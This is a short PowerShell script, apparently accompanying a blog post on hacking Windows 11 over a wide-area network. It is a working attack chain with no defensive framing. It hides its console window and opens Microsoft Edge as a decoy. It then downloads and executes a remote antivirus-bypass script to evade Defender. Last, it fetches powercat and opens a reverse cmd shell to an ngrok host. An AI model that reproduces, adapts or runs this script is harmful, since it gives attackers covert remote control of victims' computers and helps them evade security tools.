#Blog Post https://osman-kandemir.medium.com/how-to-hack-windows-11-using-powershell-scripts-with-microsoft-edge-over-wide-area-network-d3cf3d86efb5

Function HideConsole(){
	Add-Type -Name Window -Namespace Console -MemberDefinition '
	[DllImport("Kernel32.dll")]
	public static extern IntPtr GetConsoleWindow();
	[DllImport("user32.dll")]
	public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);'
	$consolePtr = [Console.Window]::GetConsoleWindow()
	[Console.Window]::ShowWindow($consolePtr, 0)
	}

Function OpenMicrosoftEdge(){
	start microsoft-edge:http://google.com
	$wshell = New-Object -ComObject wscript.shell;
	$wshell.AppActivate('Google - Microsoft Edge')
	}

Function DefenderByPass(){
	IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/aloksaurabh/OffenPowerSh/master/Bypass/Invoke-AlokS-AvBypass.ps1'); 
	Invoke-AlokS-AvBypass;
	}

Function ReverseShell(){
	IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 4.tcp.eu.ngrok.io -p 13721 -e cmd
	}

Function RunTasks(){
	HideConsole
	OpenMicrosoftEdge
	DefenderByPass
	ReverseShell
	}

RunTasks
